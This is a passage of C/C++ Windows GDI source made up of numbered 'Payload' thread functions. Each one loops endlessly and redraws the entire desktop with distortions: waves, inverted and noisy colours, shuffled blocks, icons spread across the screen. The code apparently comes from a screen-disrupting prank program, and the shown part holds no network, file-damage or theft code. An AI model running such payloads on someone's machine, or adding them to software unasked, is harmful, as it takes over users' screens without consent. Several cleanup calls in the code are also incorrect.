        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            int bei = rand() % 2;

            if (bei == 1) {
                StretchBlt(hcdc, get, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
            }
            else {
                StretchBlt(hcdc, -get, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
            }
        }
        hdc = GetDC(0);
        HDC hcdc1 = CreateCompatibleDC(hdc);
        HBITMAP hBitmap1 = CreateCompatibleBitmap(hcdc, w, h);
        SelectObject(hcdc1, hBitmap1);
        BitBlt(hcdc1, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            int bei2 = rand() % 2;

            if (bei2 == 1) {
                StretchBlt(hcdc1, x, get, 1, h, hcdc1, x, 0, 1, h, SRCCOPY);
            }
            else {
                StretchBlt(hcdc1, x, -get, 1, h, hcdc1, x, 0, 1, h, SRCCOPY);
            }
        }

        BitBlt(hdc, 0, 0, w, h, hcdc1, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        DeleteDC(hcdc);
        DeleteDC(hcdc1);
        DeleteObject(hcdc);
        DeleteObject(hcdc1);
        DeleteObject(hBitmap);
        DeleteObject(hBitmap1);
        if (get > 40) {
            getmod = 2;
        }
        else if (get == 1 && getmod == 2) {
            getmod = 1;
        }

        if (getmod == 1) {
            get += 1;
        }
        else {
            get -= 1;
        }
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload7_num2(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        POINT p[5] = { rand() % w, rand() % h, rand() % w, rand() % h,  rand() % w, rand() % h, rand() % w, rand() % h };
        HPEN hPen = CreatePen(PS_SOLID, 5, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, hPen);
        PolyBezier(hdc, p, 4);
        DeleteObject(hPen);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload8_num1(LPVOID lpParam) {
    srand(time(NULL));
    int mode = 2;
    int block_w = 240;
    int block_h = 240;
    while (true) {
        int can1 = 1;
        int jia1 = 0; int jia2 = 0;
        int x; int y;
        int x1 = 0; int y1 = 0;
        int x2 = 0; int y2 = 0;
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BOOL bianliang1 = true;
        while (bianliang1) {
            jia1 = jia1 + block_w;
            if (jia1 > w) {
                bianliang1 = false;
            }
            else {
                can1 = can1 + 1;
            }
        }
        can1 = can1 + 1;
        bianliang1 = true;
        int can2 = 1;
        while (bianliang1) {
            jia2 = jia2 + block_h;
            if (jia2 > h) {
                bianliang1 = false;
            }
            else {
                can2 = can2 + 1;
            }
        }
        can2 = can2 + 1;
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < can2 + 1; i++) {
            for (int k = 0; k < can1 + 1; k++) {
                x = rand() % can1;
                y = i;
                if (x == 1) {
                    x1 = 0;
                }
                else if (x == 2) {
                    x1 = block_w;
                }
                else {
                    x1 = block_w * x - block_w;
                }

                if (y == 1) {
                    y1 = 0;
                }
                else if (y == 2) {
                    y1 = block_h;
                }
                else {
                    y1 = block_h * y - block_h;
                }

                x = rand() % can1;
                y = rand() % can2;
                if (x == 1) {
                    x2 = 0;
                }
                else if (x == 2) {
                    x2 = block_w;
                }
                else {
                    x2 = block_w * x - 1;
                }

                if (y == 1) {
                    y2 = 0;
                }
                else if (y == 2) {
                    y2 = block_h;
                }
                else {
                    y2 = block_h * y - 1;
                }

                StretchBlt(hcdc, x1, y1, block_w, block_h, hdc, x2, y2, block_w, block_h, SRCCOPY);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        jia1 = 0; jia2 = 0;
        can1 = 0;
        can2 = 0;
        if (mode == 1) {
            block_w += 1;
            block_h += 1;
        }
        else {
            block_w -= 1;
            block_h -= 1;
        }

        if (block_w < 40) {
            mode = 1;
        }
        else if (block_w > 240) {
            mode = 2;
        }
        else if (block_w == 240) {
            mode = 2;
        }
        Sleep(1);
    }
}

DWORD WINAPI Payload8_num2(LPVOID lpParam) {
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO BitmapInfo = { 0 };
    PRGBQUAD PRGBScreen = { 0 };
    BitmapInfo.bmiHeader.biSize = sizeof(BITMAPINFO);
    BitmapInfo.bmiHeader.biBitCount = 32;
    BitmapInfo.bmiHeader.biPlanes = 1;
    BitmapInfo.bmiHeader.biWidth = w;
    BitmapInfo.bmiHeader.biHeight = h;
    HBITMAP hBitmap = CreateDIBSection(hdc, &BitmapInfo, NULL, (void**)&PRGBScreen, NULL, NULL);
    SelectObject(hcdc, hBitmap);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            PRGBScreen[i].rgb -= i * h ^ h;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

DWORD WINAPI Payload9_num1(LPVOID lpParam) {
    int count = 1;
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        SetStretchBltMode(hcdc, 4);
        StretchBlt(hcdc, 0, 0, w + count, h - count, hcdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hcdc, 0, 0, w - count, h + count, hcdc, 0, 0, w, h, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        DeleteDC(hcdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        count += 1;
        if (count > 25) {
            count = 1;
        }
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI Payload10_num1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    while (true) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, 4 * h * w, data);
        int v = 0;
        BYTE byte = rand() % 0xff;
        for (int i = 0; w * h > i; ++i) {
            if (!(i % h) && !(rand() % 114))
                v = rand() % 114;
            *((BYTE*)data + 4 * i + v) -= 22;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}


DWORD WINAPI Payload10_num2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    HDC hdc, hdcMem; HBITMAP hbm;
    for (int i = 0;; i++, i %= 6) {
        hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i * w + i, y = i * h + i, f = (y | y + y + -1 + x + w / h);
            ((BYTE*)(data + i))[4] = (f / 1);
        }
        SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCERASE);
        DeleteObject(hbm); DeleteObject(hdcMem);
        DeleteObject(hdc);
        Sleep(50);
    }
    return 0;
}

DWORD WINAPI Payload10_num2_old(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        int v = 0;
        BYTE byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            v = rand() % 32;
            *((BYTE*)data + 4 * i + v) += *((BYTE*)(data + i + v));
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        DeleteObject(hBitmap);
        DeleteObject(hcdc);
        ReleaseDC(0, hdc);
    }
    return 0;
}

DWORD WINAPI Payload11_num1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    while (1) {
        HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0; BYTE bt = 0;
        bt = rand() & 0xffffff;
        for (int i = 0; w * h > i; i++) {
            v = rand() % 114;
            if (rand() % 2 == 1) {
                ((BYTE*)(data + i))[v ? 222 : 233] += ((BYTE*)(data + i))[i % 10] ^ bt;
            }
            else {
                ((BYTE*)(data + i))[v ? 114 : 198] += ((BYTE*)(data + i))[i % 10] ^ bt;
            }
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcMem);
        DeleteObject(hdc);
        Sleep(100);
    }
    return 0;
}

DWORD WINAPI Payload11_num2(LPVOID lpParam) {
    int pi = 3.1415926;
    int t = 40;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    while (true) {
        t = t + 2;
        if (t == 420) {
            t = 100;
        }

        for (int y = 0; y < h; y++) {
            HDC hdc = GetDC(0);
            int x = cos(y + t * pi) * 40;
            BitBlt(hdc, x, y, w, 1, hdc, 0, y, SRCERASE);
            ReleaseDC(0, hdc);
            hdc = GetDC(0);
            x = cos(t) * 40;
            BitBlt(hdc, x, y, w, 1, hdc, 0, y, SRCINVERT);
            ReleaseDC(0, hdc);
            hdc = GetDC(0);
            x = cos(t) * 40;
            BitBlt(hdc, x, y, w, 1, hdc, 0, y, SRCPAINT);
            ReleaseDC(0, hdc);
            hdc = GetDC(0);
            x = cos(t) * 40;
            BitBlt(hdc, x, y, w, 1, hdc, 0, y, NOTSRCERASE);
            ReleaseDC(0, hdc);
        }
        Sleep(10);
    }
    return 0;
}
DWORD WINAPI Payload12_num1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / h;
            int s = y * y - i;
            int b = x * x + i;
            data[i].rgb -= s | b | i;
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        DeleteObject(hBitmap);
        DeleteObject(hcdc);
        DeleteObject(hdc);
    }
    return 0;
}

DWORD WINAPI Payload12_num2(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, 0, 0, w / 10, h, hcdc, w / 10 * 9, 0, SRCCOPY);
        BitBlt(hcdc, w / 10, 0, w / 10 * 9, h, hcdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, 0, 0, w, h / 10, hcdc, 0, h / 10 * 9, SRCCOPY);
        BitBlt(hcdc, 0, h / 10, w, h / 10 * 9, hcdc, 0, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        Sleep(10);
    }
}

DWORD WINAPI Payload13_num1(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    double angle = 0;
    while (1) {
        hdc = GetDC(0);
        for (float i = 0; i < w + h; i += 0.99f) {
            int a = sin(angle) * 360;
            BitBlt(hdc, 0, i, w, 1, hdc, a, i, SRCCOPY);
            angle += 3.1415926 / 3;
            DeleteObject(&i); DeleteObject(&a);
        }
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
        DeleteObject(&angle);
        Sleep(20);
    }
}

DWORD WINAPI Payload13_num2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    while (1) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            v = rand() % 100;
            ((BYTE*)(data + i))[v % 7] += ((BYTE*)(data + i + v))[v] ^ byte;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
        Sleep(10);
    }
}

DWORD WINAPI Payload13_num3(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
    ReleaseDC(0, hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    srand(time(NULL));
    while (true) {
        for (int x = 0; x <= w; x += 32 * wdpi / 96) {
            for (int y = 0; y <= h; y += 32 * hdpi / 96) {
                HDC hdc = GetDC(0);
                HICON hIcon = ExtractIconA(0, "shell32.dll", rand() % 336);
                DrawIcon(hdc, x, y, hIcon);
                ReleaseDC(0, hdc);
                DestroyIcon(hIcon);
                DeleteObject(hIcon);
            }
        }
        Sleep(100);
    }
}

DWORD WINAPI Payload14_num1(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    HDC hcdc = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(hcdc, hBitmap);
    int mmm = 0;
    while (1)
    {
        hdc = GetDC(0);
        for (int i = 0; i <= 19; ++i)
        {
            mmm++;
            BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
            for (int y = 0; y < h; ++y)
            {
                int meeee = (double)y / 30.0 * (double)mmm;
                int x = (int)(cos(meeee) * 80.0);
                BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, SRCCOPY);
            }
            BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        }
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI Payload15_num1(LPVOID lpParam) {
    int t = 0;
    while (true) {
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        SelectObject(hcdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        PatBlt(hcdc, 0, (t % 40) * (h / 40), w, h / 40, PATINVERT);
        SelectObject(hcdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        PatBlt(hcdc, (t % 40) * (w / 40), 0, w / 40, h, PATINVERT);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        t = t + 1;
        if (t > w) {
            t = 0;
        }
        Sleep(5);
    }
}

DWORD WINAPI Payload15_num2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    double LogAngle = 0;
    while (1) {
        HDC hdc = GetDC(0);
        for (float i = 0; i < w + h; i += 0.99f) {
            int LogWaveCoreValue = cos(LogAngle) * 20;
            BitBlt(hdc, 0, i, w, 1, hdc, LogWaveCoreValue, i, SRCERASE);
            LogAngle += 3.1415926 / 10;
        }
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI Payload15_num3(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y <= h; y++) {
            BitBlt(hcdc, 10 * ((rand() % 3) - 3), y, w, 1, hcdc, 0, y, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        Sleep(10);
    }
}

DWORD WINAPI Payload16_num1(LPVOID lpParam) {
    srand(time(NULL));
    HDC hdc = GetDC(0);
    HDC hcdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hcdc, hbmTemp);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            rgbScreen[i].rgb = (rgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
        }

        int randrand = (rand() % 80) + 30;
        if (rand() % 2 != 1) {
            BitBlt(hcdc, 0, 0, w, h, hcdc, -randrand, 0, SRCCOPY);
            BitBlt(hcdc, 0, 0, w, h, hcdc, w - randrand, 0, SRCCOPY);
        }
        else {
            BitBlt(hcdc, 0, 0, w, h, hcdc, 0, -randrand, SRCCOPY);
            BitBlt(hcdc, 0, 0, w, h, hcdc, 0, h - randrand, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI Payload16_num2(LPVOID lpParam) {
    RECT rect;
    HDC hdc = GetDC(NULL);
    GetWindowRect(GetDesktopWindow(), &rect);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
    ReleaseDC(0, hdc);
    int a = 11;
    for (int t = 0;; t++)
    {
        int b = rand() % a;
        const int size = b * 100 * wdpi / 96;
        int w = GetSystemMetrics(SM_CXSCREEN) - (b * 50 * wdpi / 96), h = GetSystemMetrics(SM_CYSCREEN) - (b * 50 * hdpi / 96);
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

        for (int i = 0; i < size; i += (100 * wdpi / 96))
        {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(25);
        }
    }
}


DWORD WINAPI Payload16_num3(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        StretchBlt(hcdc, 0, 0, w / 2, h / 2, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hcdc, w / 2, 0, w / 2, h / 2, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hcdc, 0, h / 2, w / 2, h / 2, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hcdc, w / 2, h / 2, w / 2, h / 2, hdc, 0, 0, w, h, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        Sleep(500);
    }
}

DWORD WINAPI Payload17_num1(LPVOID lpParam) {
    srand(time(NULL));
    HDC hdc = GetDC(NULL);
    HDC hcdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    int i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                FLOAT fx = ((y)+(i + i * 10));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / h * .10f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        HBRUSH brush = CreateHatchBrush(rand() % 7, Hue(rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI Payload18_num1(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb *= x * y;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        DeleteDC(hdcScreen);
    }
}

DWORD WINAPI Payload18_num1_old(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        StretchBlt(hcdc, 0, 0, w / 2, h / 2, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hcdc, w / 2, 0, w / 2, h / 2, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hcdc, 0, h / 2, w / 2, h / 2, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hcdc, w / 2, h / 2, w / 2, h / 2, hdc, 0, 0, w, h, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        Sleep(10);
    }
}


DWORD WINAPI Payload18_num2_old(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI Payload19_num1(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = 22;
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / h * .10f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}


DWORD WINAPI Payload19_num2(LPVOID lpParam) {
    while (true) {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        BLENDFUNCTION blur;
        HBITMAP bmp;
        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
